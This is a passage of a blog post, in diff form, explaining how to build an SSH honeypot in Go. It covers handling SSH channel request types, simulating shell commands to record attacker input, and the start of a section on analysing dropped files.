+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>On line 18 we just log out of band requests that aren&rsquo;t what we want. Line 20 handles the meat and potatoes of our programs which is incoming commands and SOCKS proxy requests. We do both of these in go routines so multiple clients can connect at once.</p>
+
+<p>The next important step is handling both out of band requests and incoming TPC connections - jump to the end of the codelbock for an explanation.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">func</span> <span class="nx">handleChannels</span><span class="p">(</span><span class="nx">chans</span> <span class="o">&lt;-</span><span class="kd">chan</span> <span class="nx">ssh</span><span class="p">.</span><span class="nx">NewChannel</span><span class="p">,</span> <span class="nx">perms</span> <span class="o">*</span><span class="nx">ssh</span><span class="p">.</span><span class="nx">Permissions</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>  <span class="c1">// Service the incoming Channel channel.</span>
+</span><span class='line'>  <span class="k">for</span> <span class="nx">newChannel</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">chans</span> <span class="p">{</span>
+</span><span class='line'>      <span class="nx">channel</span><span class="p">,</span> <span class="nx">requests</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">newChannel</span><span class="p">.</span><span class="nx">Accept</span><span class="p">()</span>
+</span><span class='line'>      <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span><span class='line'>          <span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;could not accept channel (%s)&quot;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span><span class='line'>          <span class="k">continue</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="kd">var</span> <span class="nx">shell</span> <span class="kt">string</span>
+</span><span class='line'>      <span class="nx">shell</span> <span class="p">=</span> <span class="nx">os</span><span class="p">.</span><span class="nx">Getenv</span><span class="p">(</span><span class="s">&quot;SHELL&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="k">if</span> <span class="nx">shell</span> <span class="o">==</span> <span class="s">&quot;&quot;</span> <span class="p">{</span>
+</span><span class='line'>          <span class="nx">shell</span> <span class="p">=</span> <span class="nx">DEFAULT_SHELL</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span> <span class="nx">newChannel</span><span class="p">.</span><span class="nx">ChannelType</span><span class="p">()</span> <span class="o">==</span> <span class="s">&quot;direct-tcpip&quot;</span> <span class="p">{</span>
+</span><span class='line'>          <span class="nx">term</span> <span class="o">:=</span> <span class="nx">terminal</span><span class="p">.</span><span class="nx">NewTerminal</span><span class="p">(</span><span class="nx">channel</span><span class="p">,</span> <span class="s">&quot;&quot;</span><span class="p">)</span>
+</span><span class='line'>          <span class="k">go</span> <span class="nx">HandleTcpReading</span><span class="p">(</span><span class="nx">channel</span><span class="p">,</span> <span class="nx">term</span><span class="p">,</span> <span class="nx">perms</span><span class="p">)</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="c1">// Sessions have out-of-band requests such as &quot;shell&quot;, &quot;pty-req&quot; and &quot;env&quot;</span>
+</span><span class='line'>      <span class="k">go</span> <span class="kd">func</span><span class="p">(</span><span class="nx">in</span> <span class="o">&lt;-</span><span class="kd">chan</span> <span class="o">*</span><span class="nx">ssh</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">for</span> <span class="nx">req</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">in</span> <span class="p">{</span>
+</span><span class='line'>              <span class="nx">term</span> <span class="o">:=</span> <span class="nx">terminal</span><span class="p">.</span><span class="nx">NewTerminal</span><span class="p">(</span><span class="nx">channel</span><span class="p">,</span> <span class="s">&quot;&quot;</span><span class="p">)</span>
+</span><span class='line'>              <span class="nx">handler</span> <span class="o">:=</span> <span class="nx">NewCommandHandler</span><span class="p">(</span><span class="nx">term</span><span class="p">)</span>
+</span><span class='line'>              <span class="nx">handler</span><span class="p">.</span><span class="nx">Register</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">Ls</span><span class="p">{},</span> <span class="o">&amp;</span><span class="nx">LsAl</span><span class="p">{},</span>
+</span><span class='line'>                  <span class="o">&amp;</span><span class="nx">Help</span><span class="p">{},</span>
+</span><span class='line'>                  <span class="o">&amp;</span><span class="nx">Pwd</span><span class="p">{},</span>
+</span><span class='line'>                  <span class="o">&amp;</span><span class="nx">UnsetHistory</span><span class="p">{},</span>
+</span><span class='line'>                  <span class="o">&amp;</span><span class="nx">Uname</span><span class="p">{},</span>
+</span><span class='line'>                  <span class="o">&amp;</span><span class="nx">Echo</span><span class="p">{},</span>
+</span><span class='line'>                  <span class="o">&amp;</span><span class="nx">Whoami</span><span class="p">{</span><span class="nx">User</span><span class="p">:</span> <span class="s">&quot;root&quot;</span><span class="p">},</span>
+</span><span class='line'>              <span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>              <span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;Payload: %s&quot;</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Payload</span><span class="p">)</span>
+</span><span class='line'>              <span class="nx">ok</span> <span class="o">:=</span> <span class="kc">false</span>
+</span><span class='line'>              <span class="k">switch</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Type</span> <span class="p">{</span>
+</span><span class='line'>              <span class="c1">// exec is used: ssh user@host &#39;some command&#39;</span>
+</span><span class='line'>              <span class="k">case</span> <span class="s">&quot;exec&quot;</span><span class="p">:</span>
+</span><span class='line'>                  <span class="nx">ok</span> <span class="p">=</span> <span class="kc">true</span>
+</span><span class='line'>                  <span class="nx">command</span> <span class="o">:=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">Payload</span><span class="p">[</span><span class="mi">4</span> <span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Payload</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">+</span><span class="mi">4</span><span class="p">])</span>
+</span><span class='line'>
+</span><span class='line'>                  <span class="nx">cmdOut</span><span class="p">,</span> <span class="nx">newLine</span> <span class="o">:=</span> <span class="nx">handler</span><span class="p">.</span><span class="nx">MatchAndRun</span><span class="p">(</span><span class="nx">command</span><span class="p">)</span>
+</span><span class='line'>                  <span class="nx">term</span><span class="p">.</span><span class="nx">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">cmdOut</span><span class="p">))</span>
+</span><span class='line'>                  <span class="k">if</span> <span class="nx">newLine</span> <span class="p">{</span>
+</span><span class='line'>                      <span class="nx">term</span><span class="p">.</span><span class="nx">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&quot;\r\n&quot;</span><span class="p">))</span>
+</span><span class='line'>                  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>                  <span class="nx">shellCommand</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">ShellCommand</span><span class="p">{</span><span class="nx">Cmd</span><span class="p">:</span> <span class="nx">command</span><span class="p">,</span> <span class="nx">Guid</span><span class="p">:</span> <span class="nx">perms</span><span class="p">.</span><span class="nx">Extensions</span><span class="p">[</span><span class="s">&quot;guid&quot;</span><span class="p">]}</span>
+</span><span class='line'>                  <span class="k">go</span> <span class="nx">shellCommand</span><span class="p">.</span><span class="nx">Save</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'>                  <span class="nx">channel</span><span class="p">.</span><span class="nx">Close</span><span class="p">()</span>
+</span><span class='line'>              <span class="c1">// shell is used: ssh user@host ... then commands are entered</span>
+</span><span class='line'>              <span class="k">case</span> <span class="s">&quot;shell&quot;</span><span class="p">:</span>
+</span><span class='line'>                  <span class="k">for</span> <span class="p">{</span>
+</span><span class='line'>                      <span class="nx">term</span><span class="p">.</span><span class="nx">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&quot;root@localhost:/# &quot;</span><span class="p">))</span>
+</span><span class='line'>                      <span class="nx">line</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">term</span><span class="p">.</span><span class="nx">ReadLine</span><span class="p">()</span>
+</span><span class='line'>                      <span class="k">if</span> <span class="nx">err</span> <span class="o">==</span> <span class="nx">io</span><span class="p">.</span><span class="nx">EOF</span> <span class="p">{</span>
+</span><span class='line'>                          <span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;EOF detected, closing&quot;</span><span class="p">)</span>
+</span><span class='line'>                          <span class="nx">channel</span><span class="p">.</span><span class="nx">Close</span><span class="p">()</span>
+</span><span class='line'>                          <span class="nx">ok</span> <span class="p">=</span> <span class="kc">true</span>
+</span><span class='line'>                          <span class="k">break</span>
+</span><span class='line'>                      <span class="p">}</span>
+</span><span class='line'>                      <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span><span class='line'>                          <span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;Error: %s&quot;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span><span class='line'>                      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>                      <span class="nx">cmdOut</span><span class="p">,</span> <span class="nx">newLine</span> <span class="o">:=</span> <span class="nx">handler</span><span class="p">.</span><span class="nx">MatchAndRun</span><span class="p">(</span><span class="nx">line</span><span class="p">)</span>
+</span><span class='line'>                      <span class="nx">term</span><span class="p">.</span><span class="nx">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">cmdOut</span><span class="p">))</span>
+</span><span class='line'>                      <span class="k">if</span> <span class="nx">newLine</span> <span class="p">{</span>
+</span><span class='line'>                          <span class="nx">term</span><span class="p">.</span><span class="nx">Write</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="s">&quot;\r\n&quot;</span><span class="p">))</span>
+</span><span class='line'>                      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>                      <span class="nx">shellCommand</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">ShellCommand</span><span class="p">{</span><span class="nx">Cmd</span><span class="p">:</span> <span class="nx">line</span><span class="p">,</span> <span class="nx">Guid</span><span class="p">:</span> <span class="nx">perms</span><span class="p">.</span><span class="nx">Extensions</span><span class="p">[</span><span class="s">&quot;guid&quot;</span><span class="p">]}</span>
+</span><span class='line'>                      <span class="k">go</span> <span class="nx">shellCommand</span><span class="p">.</span><span class="nx">Save</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'>                      <span class="nx">log</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="nx">line</span><span class="p">)</span>
+</span><span class='line'>                  <span class="p">}</span>
+</span><span class='line'>                  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">Payload</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">{</span>
+</span><span class='line'>                      <span class="nx">ok</span> <span class="p">=</span> <span class="kc">true</span>
+</span><span class='line'>                  <span class="p">}</span>
+</span><span class='line'>              <span class="k">case</span> <span class="s">&quot;pty-req&quot;</span><span class="p">:</span>
+</span><span class='line'>                  <span class="c1">// Responding &#39;ok&#39; here will let the client</span>
+</span><span class='line'>                  <span class="c1">// know we have a pty ready for input</span>
+</span><span class='line'>                  <span class="nx">ok</span> <span class="p">=</span> <span class="kc">true</span>
+</span><span class='line'>                  <span class="c1">// Parse body...</span>
+</span><span class='line'>                  <span class="nx">termLen</span> <span class="o">:=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Payload</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+</span><span class='line'>                  <span class="nx">termEnv</span> <span class="o">:=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">Payload</span><span class="p">[</span><span class="mi">4</span> <span class="p">:</span> <span class="nx">termLen</span><span class="o">+</span><span class="mi">4</span><span class="p">])</span>
+</span><span class='line'>                  <span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;pty-req &#39;%s&#39;&quot;</span><span class="p">,</span> <span class="nx">termEnv</span><span class="p">)</span>
+</span><span class='line'>              <span class="k">default</span><span class="p">:</span>
+</span><span class='line'>                  <span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;[%s] Payload: %s&quot;</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Type</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Payload</span><span class="p">)</span>
+</span><span class='line'>              <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>              <span class="k">if</span> <span class="p">!</span><span class="nx">ok</span> <span class="p">{</span>
+</span><span class='line'>                  <span class="nx">log</span><span class="p">.</span><span class="nx">Printf</span><span class="p">(</span><span class="s">&quot;declining %s request...&quot;</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">Type</span><span class="p">)</span>
+</span><span class='line'>              <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>              <span class="nx">req</span><span class="p">.</span><span class="nx">Reply</span><span class="p">(</span><span class="nx">ok</span><span class="p">,</span> <span class="kc">nil</span><span class="p">)</span>
+</span><span class='line'>          <span class="p">}</span>
+</span><span class='line'>      <span class="p">}(</span><span class="nx">requests</span><span class="p">)</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>On line 16 we&rsquo;re sending the TCP reading off to another function to get handled - the rest of the requests coming in out-of-band will be handled in the function on line 22.</p>
+
+<p>On line 24 we use the <code>terminal</code> package to create a new terminal for reading input and sending output back to the user. Line 25 is our command handler which will do the regex and pattern matching.</p>
+
+<p>Our case/switch statement is doing the heavy lifting here starting on line 39.</p>
+
+<p>Now we need to understand the different types of SSH connections and requests that can be made:</p>
+
+<ul>
+<li><p>(line 16) <code>direct-tcpip</code> is what happens when you use your SSH connection to proxy TCP connections (like a SOCKS proxy).</p></li>
+<li><p>(line 39) <code>exec</code> is what happens when you run commands like <code>ssh some user@host ‘ls -al’</code></p></li>
+<li><p>(line 54) <code>shell</code> is what happens when you actually login and start executing commands, a PTY gets launched and you have an interactive command prompt.</p></li>
+<li><p>(line 82) <code>pty-req</code> lets the SSH client know that its ready to accept input (works in conjunction with shell).</p></li>
+</ul>
+
+
+<p>These are all the command types we care about for now.</p>
+
+<p><a name="simulating-commands"></a></p>
+
+<h2>Simulating Commands</h2>
+
+<p>A few things we need to keep in mind for this part of the honeypot:</p>
+
+<ul>
+<li>Need to simulate commands that are run by attackers</li>
+<li>Go’s interface pattern fits well here</li>
+<li>Need to understand command return values
+
+<ul>
+<li>Does the command return a new line?</li>
+<li>If output doesn’t match (including new lines) it may throw off bots/scripts that check for exact output matching</li>
+</ul>
+</li>
+<li>Need to be able to match commands based on regex or equality
+
+<ul>
+<li>Needs to handle commands like:
+
+<ul>
+<li>echo -n test</li>
+<li>echo test</li>
+<li>echo foo bar baz</li>
+</ul>
+</li>
+<li>Don’t want to write a handler for each variation of a command with flags - would never cover all cases</li>
+</ul>
+</li>
+</ul>
+
+
+<p>So with all that in mind lets lay out a framework for the command handler. We need something to register all of our commands, and then a structure for our commands to be run consistently.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">type</span> <span class="nx">CommandHandler</span> <span class="kd">struct</span> <span class="p">{</span>
+</span><span class='line'>  <span class="nx">Terminal</span> <span class="o">*</span><span class="nx">terminal</span><span class="p">.</span><span class="nx">Terminal</span>
+</span><span class='line'>  <span class="nx">Commands</span> <span class="p">[]</span><span class="nx">Command</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">func</span> <span class="nx">NewCommandHandler</span><span class="p">(</span><span class="nx">term</span> <span class="o">*</span><span class="nx">terminal</span><span class="p">.</span><span class="nx">Terminal</span><span class="p">)</span> <span class="o">*</span><span class="nx">CommandHandler</span> <span class="p">{</span>
+</span><span class='line'>  <span class="k">return</span> <span class="o">&amp;</span><span class="nx">CommandHandler</span><span class="p">{</span><span class="nx">Terminal</span><span class="p">:</span> <span class="nx">term</span><span class="p">,</span> <span class="nx">Commands</span><span class="p">:</span> <span class="p">[]</span><span class="nx">Command</span><span class="p">{}}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">func</span> <span class="p">(</span><span class="nx">ch</span> <span class="o">*</span><span class="nx">CommandHandler</span><span class="p">)</span> <span class="nx">Register</span><span class="p">(</span><span class="nx">commands</span> <span class="o">...</span><span class="nx">Command</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>  <span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">c</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">commands</span> <span class="p">{</span>
+</span><span class='line'>      <span class="nx">ch</span><span class="p">.</span><span class="nx">Commands</span> <span class="p">=</span> <span class="nb">append</span><span class="p">(</span><span class="nx">ch</span><span class="p">.</span><span class="nx">Commands</span><span class="p">,</span> <span class="nx">c</span><span class="p">)</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">func</span> <span class="p">(</span><span class="nx">ch</span> <span class="o">*</span><span class="nx">CommandHandler</span><span class="p">)</span> <span class="nx">MatchAndRun</span><span class="p">(</span><span class="nx">in</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>  <span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">c</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">ch</span><span class="p">.</span><span class="nx">Commands</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">if</span> <span class="nx">c</span><span class="p">.</span><span class="nx">Match</span><span class="p">(</span><span class="nx">strings</span><span class="p">.</span><span class="nx">TrimSpace</span><span class="p">(</span><span class="nx">in</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nx">Run</span><span class="p">(</span><span class="nx">in</span><span class="p">)</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="k">return</span> <span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span><span class="s">&quot;bash: %s: command not found&quot;</span><span class="p">,</span> <span class="nx">in</span><span class="p">),</span> <span class="kc">false</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">type</span> <span class="nx">Command</span> <span class="kd">interface</span> <span class="p">{</span>
+</span><span class='line'>  <span class="nx">Match</span><span class="p">(</span><span class="kt">string</span><span class="p">)</span> <span class="kt">bool</span>
+</span><span class='line'>  <span class="nx">Run</span><span class="p">(</span><span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="kt">bool</span><span class="p">)</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">type</span> <span class="nx">Echo</span> <span class="kd">struct</span><span class="p">{}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">Echo</span><span class="p">)</span> <span class="nx">Match</span><span class="p">(</span><span class="nx">in</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">bool</span> <span class="p">{</span>
+</span><span class='line'>  <span class="k">return</span> <span class="nx">strings</span><span class="p">.</span><span class="nx">Contains</span><span class="p">(</span><span class="nx">in</span><span class="p">,</span> <span class="s">&quot;echo&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">Echo</span><span class="p">)</span> <span class="nx">Run</span><span class="p">(</span><span class="nx">in</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>  <span class="nx">x</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nx">Split</span><span class="p">(</span><span class="nx">in</span><span class="p">,</span> <span class="s">&quot; &quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="nx">newLine</span> <span class="o">:=</span> <span class="kc">true</span>
+</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">2</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">if</span> <span class="nx">x</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">&quot;-n&quot;</span> <span class="p">{</span>
+</span><span class='line'>          <span class="nx">newLine</span> <span class="p">=</span> <span class="kc">false</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">return</span> <span class="s">&quot;&quot;</span><span class="p">,</span> <span class="kc">true</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="nx">startPos</span> <span class="o">:=</span> <span class="mi">1</span>
+</span><span class='line'>  <span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nx">Contains</span><span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&quot;-&quot;</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">2</span> <span class="p">{</span>
+</span><span class='line'>          <span class="nx">startPos</span> <span class="p">=</span> <span class="mi">2</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="nx">strings</span><span class="p">.</span><span class="nx">Join</span><span class="p">(</span><span class="nx">x</span><span class="p">[</span><span class="nx">startPos</span><span class="p">:</span><span class="nb">len</span><span class="p">(</span><span class="nx">x</span><span class="p">)],</span> <span class="s">&quot; &quot;</span><span class="p">),</span> <span class="nx">newLine</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>On lines 1 and 6 we&rsquo;re creating our <code>CommandHandler</code> which will be where all commands get registered to and where we store our terminal to write to.</p>
+
+<p>Line 10 lets us register <code>1...n</code> commands at once using go&rsquo;s variadic argument syntax.</p>
+
+<p>Line 16 is our runner that will take in the input from attacker and run it through our registered commands. We return the command output and also whether or not it will output a newline at the end. If no command is registered that will match, we return the generic bash command not found.</p>
+
+<p>Line 25 is our interface definition. We have two functions, <code>Match</code> and <code>Run</code>. <code>Run</code> follows the <code>MatchAndRun</code> pattern where we returns the command output and whether or not a newline is needed. The meat of this command can do wahtever you want it to do - in this case we&rsquo;re checking for some specific flags that I&rsquo;ve seen used on the honeypot and parsing them out.</p>
+
+<p>The <code>Match</code> portion in this case is just a simple <code>Contains</code> check - you can do whatever you want in this portion - it just needs to return a boolean. Go nuts with regexes or just do a simple equality check.</p>
+
+<p><a name="persistence-layer"></a></p>
+
+<h2>Persistence Layer</h2>
+
+<p>For our persistence layer their isn’t anything special going on. We have a few configurable options via ENV vars, ability to skip sending commands to the remote, and ability to provide a SERVER_URL to dev against the local rails application.</p>
+
+<p>Now that we have a working honeypot that is able to accept logins, simulate and record commands, we can start analyzing dropped files.</p>
+
+<p><a name="analyzing-dropped-files"></a></p>
+
+<h2>Analyzing Dropped Files</h2>
+
+<p>Tools we’ll be using from OS X (please note this is not exhaustive):</p>
+
+<ul>
+<li>Virtualbox</li>
+<li>Docker (<code>docker-machine</code> on OS X)</li>
+<li>Wireshark</li>
+<li>VirusTotal</li>
+</ul>
+
+
+<p>We’re going to use wireshark to process PCAP files generated by Wireshark, so we’ll need to tell VirtualBox to create the network capture:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
